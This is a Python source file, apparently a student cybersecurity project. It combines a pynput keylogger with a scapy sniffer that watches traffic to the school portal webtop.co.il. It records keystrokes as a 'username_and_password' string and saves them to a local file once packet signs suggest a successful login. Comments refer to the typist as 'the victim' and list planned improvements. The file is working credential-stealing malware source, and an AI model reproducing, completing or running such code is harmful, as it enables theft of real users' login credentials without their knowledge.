from scapy.all import *  # packet capture module
import socket
import threading
from pynput.keyboard import Listener
import logging
import sys

caps = False
caps_lock_on = False
shift = False
isTrue = False
has_two = 0
counter = 0

# logdir = os.environ['USERPROFILE'] + '\\Desktop\\'
logdir = r"C:/Users/Admin/Documents/Yehonatan/Cyber/project/"
# Uploads logged keys to a file called klog-res.txt
logging.basicConfig(filename=(logdir + "123.txt"), level=logging.INFO, format="%(message)s")
# logs the keys to file
LIST_OF_SPECIALS = ["Key.tab", "Key.caps_lock", "Key.shift", "Key.ctrl_l", "Key.cmd", "Key.alt_l", "Key.space",
                    "Key.alt_r", "Key.menu", "Key.left", "Key.down", "Key.right", "Key.up", "Key.insert",
                    "Key.delete", "Key.print_screen", "Key.home", "Key.end", "Key.page_up", "Key.page_down",
                    "Key.num_lock", "Key.f5", "Key.esc", "Key.delete", "Key.esc"]

username_and_password = ""
# Special symbols that can only be achieved with shift letter
special_numbers = {"1": "!", "2": "@", "3": "#", "4": "$",
                   "5": "%", "6": "^", "7": "&", "8": "*",
                   "9": "(", "0": ")", "=": "+", "-": "_", "/": "?", ",": "<", ".": ">"}


def check(packet):
    global counter
    global has_two
    counter += 1
    print(packet[0][TCP].window)
    if int(packet[0][TCP].window) == 65340:
        print("Great success")
        has_two += 1
        return
    else:
        if counter == 2:
            has_two = 3
        print("not yet")
        return


def change_caps(key):
    """ function to tell the program if it should store uppercase or lowercase"""
    global shift
    global caps
    global caps_lock_on
    if str(key) == "Key.caps_lock":
        if not caps:
            caps = True
        else:
            caps = False
    if str(key) == "Key.shift":
        if shift:
            shift = False
            caps = False
        else:
            caps = True
            shift = True
    return


def add_password(key):
    """Adds the letter to the username and password"""
    global caps
    global shift
    global special_numbers
    global username_and_password
    if str(key).replace("'", "") in special_numbers and shift:
        username_and_password += special_numbers[str(key).replace("'", "")]
    else:
        if str(key) == "Key.space":
            letter = " "
        else:
            letter = str(key).replace("'", '')
        if caps:
            username_and_password += letter.upper()
        else:
            username_and_password += letter


# print(username_and_password)

def delete_letter():
    """ Deletes a character if the user hit the backspace"""
    global username_and_password
    username_and_password = username_and_password[0:-1]


def on_press(key):
    """ When a key is being pressed"""
    if str(key) == "Key.caps_lock" or str(key) == "Key.shift":
        change_caps(key)
        return


def log():
    """ Logs the username and password."""
    global username_and_password
    logging.info(username_and_password)


def on_release(key):
    """ When a key is being released"""
    global username_and_password
    global shift
    global caps
    if str(key) == "Key.shift":
        change_caps(key)
    # print('{0} released'.format(key))
    elif str(key) == "Key.shift" or str(key) == "Key.caps_lock" or str(key) == "Key.tab":
        pass

    elif str(key) == "Key.backspace":
        delete_letter()
    else:
        add_password(key)


def run_keylogger():
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

        print("Finished logging")


def main():
    global has_two
    global username_and_password
    print('start')
    addr1 = socket.gethostbyname('webtop.co.il')
    got_to_webtop = sniff(iface="Ethernet", filter=f"host {addr1} and tcp and tcp[tcpflags] & tcp-fin == 1", count=4)
    print(got_to_webtop.show())
    a = threading.Thread(target=run_keylogger)
    a.setDaemon(True)
    a.start()

    while 1:
        check_if_passed = sniff(iface="Ethernet",
                                filter=f"host {addr1} and tcp and tcp[tcpflags] & tcp-fin == 1",
                                count=4)
        check(check_if_passed[0])
        check(check_if_passed[1])
        print(has_two)
        if has_two == 2:
            print(username_and_password)
            log()
            sys.exit()
        else:
            has_two = 0
        print(has_two)


if __name__ == "__main__":
    main()

# Further continue the program beyond minimal viable product:
# Make the keylogger deal with the shift after the victim entered username and password
# It is too slow now and can miss Changes in shift and check generally for bugs
# Improve packet sniffer (too long on the start of sniff and check generally for bugs
